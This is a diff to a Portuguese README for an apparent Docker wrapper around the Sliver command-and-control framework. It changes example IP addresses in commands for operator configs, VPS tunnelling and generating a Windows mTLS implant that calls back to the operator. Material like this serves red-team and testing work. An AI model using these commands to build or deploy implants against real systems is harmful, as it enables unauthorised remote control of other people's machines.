@@ -97,7 +97,7 @@ com o IP de destino:
 ./Sliver_Handler.py operator raugi
 
 # Acesso via LAN — IP explicito
-./Sliver_Handler.py operator raugi --lhost 192.168.1.177
+./Sliver_Handler.py operator raugi --lhost 192.168.1.1
 
 # Acesso via VPS (ela tunela pro seu Kali)
 ./Sliver_Handler.py operator raugi --lhost 55.55.55.55
@@ -106,7 +106,7 @@ com o IP de destino:
 ./Sliver_Handler.py operator raugi --lhost 55.55.55.55 --lport 8443
 
 # Conecta usando o config gerado (via host network, sem Docker interno)
-./Sliver_Handler.py connect raugi_192.168.1.177.cfg
+./Sliver_Handler.py connect raugi_192.168.1.1.cfg
 
 # Lista configs disponiveis na sessao
 ./Sliver_Handler.py connect
@@ -118,7 +118,7 @@ rota (direto, VPN, VPS, tunnel). Basta que a porta esteja acessível.
 
 ```
  ┌─────────────────────────────────────────────────────────┐
- │                      seu Kali (192.168.1.177)           │
+ │                      seu Kali (192.168.1.1)           │
  │  ┌──────────────────────────────────────────────────┐   │
  │  │ Docker                                           │   │
  │  │  server (daemon 0.0.0.0:31337)  ◄─── client     │   │
@@ -127,7 +127,7 @@ rota (direto, VPN, VPS, tunnel). Basta que a porta esteja acessível.
  │          │ porta 31337 publicada no host                 │
  ├──────────┼──────────────────────────────────────────────┤
  │          ▼                                              │
- │   192.168.1.177:31337  ◄────  connect (host network)    │
+ │   192.168.1.1:31337  ◄────  connect (host network)    │
  │          │                                              │
  └──────────┼──────────────────────────────────────────────┘
             │ (ou via VPS / tunnel)
@@ -143,8 +143,8 @@ ou client salvar em `/shared/` aparece localmente — sem `docker cp`.
 
 ```bash
 # No console do Sliver:
-[server] sliver > new-operator --name colega --lhost 192.168.1.177 --save /shared/colega.cfg
-[server] sliver > generate --mtls 192.168.1.177:443 --os windows --save /shared/implant.exe
+[server] sliver > new-operator --name colega --lhost 192.168.1.1 --save /shared/colega.cfg
+[server] sliver > generate --mtls 192.168.1.1:443 --os windows --save /shared/implant.exe
 
 # Na sua maquina:
 ./Sliver_Handler.py shared          # lista o que tem no shared/
